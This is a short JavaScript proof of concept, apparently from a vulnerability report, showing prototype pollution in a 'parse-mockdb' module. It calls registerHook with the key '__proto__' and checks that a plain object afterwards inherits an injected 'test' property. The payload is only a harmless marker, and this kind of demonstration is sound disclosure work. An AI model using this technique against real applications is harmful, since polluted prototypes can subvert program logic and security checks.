import {registerHook} from './parse-mockdb.js';
console.log({}.test);
registerHook("__proto__", "test", "polluted");
console.log({}.test);
